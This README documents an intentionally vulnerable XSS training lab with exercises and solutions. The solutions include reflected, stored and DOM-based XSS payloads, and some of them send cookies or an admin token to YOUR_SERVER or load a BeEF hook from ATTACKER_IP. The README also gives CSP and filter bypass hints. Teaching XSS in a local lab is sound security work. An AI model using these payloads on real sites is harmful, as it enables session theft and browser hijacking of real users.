# VulnLab - XSS Playground

> An intentionally vulnerable web application for learning Cross-Site Scripting (XSS) through hands-on practice.

**Author:** Cysec Don ([cysecdon@gmail.com](mailto:cysecdon@gmail.com))

---

## ⚠️ DISCLAIMER

**This application is INTENTIONALLY VULNERABLE.** It is designed for educational purposes only. DO NOT deploy this application on a public-facing server or any network accessible by unauthorized users. Running this application exposes your system to XSS attacks. Use only in isolated, local environments for security training and research.

By using this software, you accept full responsibility for any damage or misuse. The author is not liable for any illegal or unauthorized activities performed using this application.

---

## Overview

VulnLab is a minimalistic, beautifully designed web application that contains multiple intentional XSS vulnerabilities. It provides a safe, controlled environment where security enthusiasts, developers, and students can:

- Practice identifying and exploiting Reflected, Stored, and DOM-based XSS
- Learn how insecure coding practices lead to real vulnerabilities
- Test filter bypass techniques and payload engineering
- Understand privilege escalation through XSS
- Integrate with BeEF (Browser Exploitation Framework) for advanced exercises

The application is built with **Node.js** and **Express**, using vanilla HTML/CSS/JavaScript on the frontend. No frameworks, no abstractions — just raw, vulnerable code that you can see, understand, and exploit.

---

## Quick Start

### Option 1: Docker (Recommended)

The easiest way to get started. Docker ensures a clean, isolated environment.

```bash
# Clone the repository
git clone https://github.com/cysec-don/XSS.git
cd XSS

# Build and run with Docker Compose
docker compose up -d

# The lab is now running at http://localhost:3001
```

To stop the lab:
```bash
docker compose down
```

To view logs:
```bash
docker compose logs -f
```

To rebuild after making changes:
```bash
docker compose build --no-cache
docker compose up -d
```

### Option 2: Docker (Manual Build)

```bash
# Build the Docker image
docker build -t vulnlab-xss .

# Run the container
docker run -d -p 3001:3001 --name vulnlab vulnlab-xss

# The lab is now running at http://localhost:3001
```

To stop:
```bash
docker stop vulnlab
docker rm vulnlab
```

### Option 3: Node.js (Local)

```bash
# Clone the repository
git clone https://github.com/cysec-don/XSS.git
cd XSS

# Install dependencies
npm install

# Start the server
npm start

# The lab is now running at http://localhost:3001
```

---

## Application Structure

```
XSS/
├── server.js              # Express server with vulnerable routes
├── package.json           # Node.js project configuration
├── public/
│   └── css/
│       └── style.css      # Application stylesheet (dark theme)
├── Dockerfile             # Docker build configuration
├── docker-compose.yml     # Docker Compose for easy deployment
├── .dockerignore          # Docker build exclusions
├── .gitignore             # Git exclusions
└── README.md              # This file
```

---

## Vulnerable Pages

### 1. Search Page (Reflected XSS)

**URL:** `http://localhost:3001/`

The search page reflects the `q` query parameter directly in the HTML response without any encoding or sanitization. This is the classic Reflected XSS scenario.

**How to exploit:**
```
http://localhost:3001/?q=<script>alert(document.cookie)</script>
```

**What's vulnerable:** The `query` value is inserted into both the search input's `value` attribute and the results heading using template literals without escaping.

---

### 2. Comments Page (Stored XSS)

**URL:** `http://localhost:3001/comments`

Users can post comments with an author name and text. Both fields are stored in memory and displayed to all visitors without any HTML encoding. This is a classic Stored XSS vulnerability.

**How to exploit:** Post a comment with any of these payloads:

| Payload | Description |
|---------|-------------|
| `<script>alert(1)</script>` | Basic script tag |
| `<img src=x onerror="alert(document.cookie)">` | Image onerror handler |
| `<svg onload="alert(1)">` | SVG element |
| `<details open ontoggle="alert(1)">` | Details element |

**What's vulnerable:** The `comment.author` and `comment.text` values are concatenated directly into the HTML response without escaping.

---

### 3. Profile Page (Stored + DOM-Based XSS)

**URL:** `http://localhost:3001/profile/user1` or `http://localhost:3001/profile/admin`

The profile page contains **two** vulnerabilities:

**a) Stored XSS via Bio Field:**
Users can update their bio through the edit form. The bio content is stored and rendered without encoding.

**How to exploit:** Update the bio field with: `<script>alert(1)</script>`

**b) DOM-Based XSS via URL Hash:**
The page contains JavaScript that reads `window.location.hash` and sets it as `innerHTML` of a div element. The hash fragment is never sent to the server, making this invisible to server-side defenses.

**How to exploit:**
```
http://localhost:3001/profile/user1#<img src=x onerror="alert(1)">
```

**What's vulnerable:**
- The `profile.bio` value is inserted into HTML without escaping
- Client-side JavaScript reads `window.location.hash` (source) and assigns it to `innerHTML` (sink)

---

### 4. Admin Dashboard (Privilege Escalation)

**URL:** `http://localhost:3001/admin`

The admin dashboard displays all user comments without encoding, and contains a hidden element with a secret admin token (`ADMIN_SECRET_TOKEN_xyz789`). This means Stored XSS payloads injected via the comments page will execute in the admin's browser context.

**How to exploit (combined attack):**
1. Post a comment with: `<script>new Image().src="http://YOUR_SERVER:8080/steal?t="+document.getElementById("admin-secret").textContent</script>`
2. When the admin visits the dashboard, the script executes and exfiltrates the secret token

**What's vulnerable:** Comments rendered in the admin dashboard use the same unescaped output as the comments page, plus the hidden token is accessible to any JavaScript running on the page.

---

### 5. API Endpoint (JSON XSS)

**URL:** `http://localhost:3001/api/search?q=test`

The API endpoint returns JSON with the query parameter embedded. While JSON responses are typically safe, misconfigured Content-Type headers can lead to content sniffing attacks.

---

## Lab Exercises

### Exercise 1: Reflected XSS — Cookie Theft

**Objective:** Craft a URL that steals the session cookie when visited by another user.

**Hints:**
1. The search query is inserted directly into the HTML response
2. You need a script tag or event handler that reads `document.cookie`
3. Use the `Image()` trick or `fetch()` to exfiltrate data without CORS issues

**Solution:**
```
http://localhost:3001/?q=<script>new Image().src="http://YOUR_SERVER:8080/steal?c="+document.cookie</script>
```

---

### Exercise 2: Stored XSS — Persistent Attack

**Objective:** Post a comment that executes JavaScript when any user views the comments page.

**Hints:**
1. The comment text field accepts any content without sanitization
2. Script tags work, but try using an `img` tag with `onerror` for variety
3. The payload persists across page loads and affects every visitor

**Solution:** Post a comment with text: `<img src=x onerror="alert(document.cookie)">`

---

### Exercise 3: DOM-Based XSS — Hash Injection

**Objective:** Exploit the DOM-based XSS on the profile page to execute JavaScript without any server interaction.

**Hints:**
1. The JavaScript on the profile page reads `window.location.hash` and sets `innerHTML`
2. The hash fragment is never sent to the server, so server-side defenses cannot detect this
3. You need an HTML element with an event handler, like `img onerror`

**Solution:**
```
http://localhost:3001/profile/user1#<img src=x onerror="alert(document.cookie)">
```

---

### Exercise 4: Privilege Escalation via Stored XSS

**Objective:** As a regular user, post a comment that steals the admin secret token from the admin dashboard.

**Hints:**
1. The admin dashboard displays comments without encoding and contains a hidden `div` with a secret token
2. Your payload needs to read the content of the `#admin-secret` element
3. Use `document.getElementById("admin-secret").textContent` to read the token

**Solution:** Post a comment with text:
```html
<script>new Image().src="http://YOUR_SERVER:8080/steal?t="+document.getElementById("admin-secret").textContent</script>
```

---

### Exercise 5: BeEF Integration — Browser Hooking

**Objective:** Hook the VulnLab application using BeEF and demonstrate post-exploitation capabilities.

**Prerequisites:** Install and run [BeEF](https://beefproject.com/) on your machine.

**Hints:**
1. Start BeEF and note the hook URL (default: `http://YOUR_IP:3000/hook.js`)
2. Use Stored XSS to inject the hook script so it persists across sessions
3. Once the browser is hooked, use BeEF modules to gather information

**Solution:** Post a comment with:
```html
<script src="http://YOUR_IP:3000/hook.js"></script>
```

Or using an event handler (bypasses simple script tag filters):
```html
<img src=x onerror="var s=document.createElement('script');s.src='http://YOUR_IP:3000/hook.js';document.body.appendChild(s)">
```

---

## Challenge Mode

Ready for a real challenge? These scenarios add defensive measures that you must bypass:

### Challenge 1: Filtered Input

Modify the search page to add a simple server-side filter that blocks the word "script" (case-insensitive). Your task is to bypass this filter and achieve XSS.

**Bypass techniques:**
- Alternative tags: `<img>`, `<svg>`, `<details>`, `<body>`
- Alternative event handlers: `onerror`, `onload`, `ontoggle`, `onfocus`
- Encoding tricks: HTML entities, Unicode escapes

### Challenge 2: CSP Enabled

Add the following CSP header to the application:
```
Content-Security-Policy: script-src 'self' https://trusted-cdn.com
```

Your task is to bypass this CSP and achieve XSS. Hint: Look for JSONP endpoints on the trusted CDN domain, or try injecting a `<base>` tag to redirect relative script sources.

### Challenge 3: Partial Sanitization

Modify the comment handler to strip `<script>` tags but leave other HTML elements untouched. Your task is to achieve XSS without using script tags.

**Bypass techniques:**
- `<img src=x onerror="alert(1)">`
- `<svg onload="alert(1)">`
- `<details open ontoggle="alert(1)">`
- `<marquee onstart="alert(1)">`

### Challenge 4: The Full Chain

Start with a Reflected XSS on the search page and achieve full account takeover:

1. Use the reflected XSS to inject a payload that creates a Stored XSS in the comments
2. The stored payload waits for the admin to view the dashboard
3. When the admin views the dashboard, the payload steals the admin token
4. Use the admin token to access the admin API and create a new admin account

---

## BeEF Integration

VulnLab is designed to work seamlessly with BeEF (Browser Exploitation Framework). To run BeEF alongside VulnLab:

### Using Docker Compose

Uncomment the `beef` service in `docker-compose.yml`, then:
```bash
docker compose up -d
```

### Manual Setup

```bash
# Install BeEF
git clone https://github.com/beefproject/beef.git
cd beef
bundle install
./beef

# BeEF control panel: http://localhost:3000/ui/panel
# Default credentials: beef / beef
```

### BeEF Hook Payloads for VulnLab

| Page | Payload |
|------|---------|
| Search (Reflected) | `http://localhost:3001/?q=<script src="http://ATTACKER_IP:3000/hook.js"></script>` |
| Comments (Stored) | `<img src=x onerror="var s=document.createElement('script');s.src='http://ATTACKER_IP:3000/hook.js';document.body.appendChild(s)">` |
| Profile (DOM) | `http://localhost:3001/profile/user1#<img src=x onerror="var s=document.createElement('script');s.src='http://ATTACKER_IP:3000/hook.js';document.body.appendChild(s)">` |

### BeEF Exercises

- **Exercise A:** Hook via Reflected XSS — Craft a URL that loads the BeEF hook
- **Exercise B:** Hook via Stored XSS — Post a comment that hooks every visitor
- **Exercise C:** Social Engineering — Use "Pretty Theft" and "Fake Flash Update" modules
- **Exercise D:** Network Reconnaissance — Use BeEF's port scanning and ping sweep modules

---

## Technical Details

### Default Port

| Service | Port |
|---------|------|
| VulnLab | 3001 |
| BeEF (optional) | 3000 |

### Data Storage

VulnLab uses in-memory data storage. All data (comments, profiles) resets when the server restarts. This is intentional — it keeps the lab clean and prevents persistent malicious payloads from surviving between sessions.

### Security Headers (Deliberately Missing)

The application does not set the following security headers, which would normally prevent or mitigate XSS attacks:

- `Content-Security-Policy` — Would restrict script sources
- `X-Content-Type-Options` — Would prevent content type sniffing
- `X-XSS-Protection` — Would enable browser XSS filter (deprecated but informative)
- `Set-Cookie` with `HttpOnly` — Would prevent cookie access via JavaScript

---

## Troubleshooting

### Port already in use

If port 3001 is already in use, you can change it:

**Docker:**
```bash
# Change the port mapping in docker-compose.yml or use:
docker run -d -p 8080:3001 --name vulnlab vulnlab-xss
```

**Node.js:**
```bash
PORT=8080 npm start
```

### Docker container won't start

```bash
# Check logs
docker compose logs vulnlab

# Rebuild from scratch
docker compose build --no-cache
docker compose up -d
```

### CSS not loading

Ensure the `public/css/` directory structure is intact and the static file middleware is configured correctly in `server.js`.

---

## License

MIT License — See [LICENSE](LICENSE) for details.

---

## Author

**Cysec Don**
Email: [cysecdon@gmail.com](mailto:cysecdon@gmail.com)
GitHub: [https://github.com/cysec-don](https://github.com/cysec-don)

---

*Remember: With great power comes great responsibility. Use your skills ethically and legally.*
